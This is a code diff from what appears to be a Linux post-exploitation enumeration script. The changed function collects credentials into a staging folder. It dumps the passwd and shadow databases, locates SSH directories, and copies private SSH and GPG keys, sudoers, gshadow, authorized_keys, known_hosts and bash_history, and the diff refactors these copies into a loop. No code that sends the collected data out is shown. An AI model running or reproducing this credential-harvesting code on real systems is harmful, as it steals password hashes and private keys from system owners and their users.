@@ -208,14 +208,16 @@ def Gather_OS():
    
    
 def GetCredentials():
-    # Feature is being rewritten to speed up process and avoid non-root permission issues
     print("[+] Collecting user and system credentials....")
     os.mkdir(Temp_Dir+"/credentials")
     os.chdir(Temp_Dir+"/credentials/")
     
     os.system('getent passwd > passwd.txt')
     os.system('getent shadow > shadow.txt')
-    
+    os.system("lastlog > lastlog.txt")
+    os.system("last -a > last.txt")
+    os.system("getent aliases > mail_aliases.txt")
+
     os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
     os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
     sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
@@ -225,35 +227,17 @@ def GetCredentials():
     open('SSH_Locations.txt','wb').write(content)
     os.system("rm ssh_locations.txt ssh_contents.txt")
 
-    if os.path.isfile("/etc/master.passwd") is True:
-        shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
-    os.system('cat /etc/sudoers > sudoers.txt')
-    if os.path.isfile("/etc/ssh/sshd_config") is True:
-        shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
-    if os.path.isfile(Home_Dir+'/.ssh/id_dsa') is True:
-        shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
-        shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
-        shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
-        shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+'/.gnupg/secring.gpg') is True:
-        shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+"/.ssh/authorized_keys") is True:
-        shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
-    if os.path.isfile(Home_Dir+"/.ssh/known_hosts") is True:               
-        shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
-    if os.path.isfile(Home_Dir+"/.bash_history") is True:
-    	shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
-    if os.path.isfile("/etc/gshadow") is True:
-        shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
-    if os.path.isfile("/etc/ca-certificates.conf") is True:
-    	shutil.copy2("/etc/ca-certificates.conf", Temp_Dir+"/credentials/")
 
-    os.system("lastlog > lastlog.txt")
-    os.system("last -a > last.txt")
-    os.system("getent aliases > mail_aliases.txt")
+    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
+                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
+                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
+    for x in credentials:
+    	if os.path.exists(x) is True:
+    		shutil.copy2(x, Temp_Dir+"/credentials/")
+
+    if os.path.exists(Home_Dir+"/.bash_history") is True:
+        shutil.copy2(Home_Dir+"/.bash_history", Temp_Dir+"/credentials/bash_history.txt")
+
 
 def NetworkInfo():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
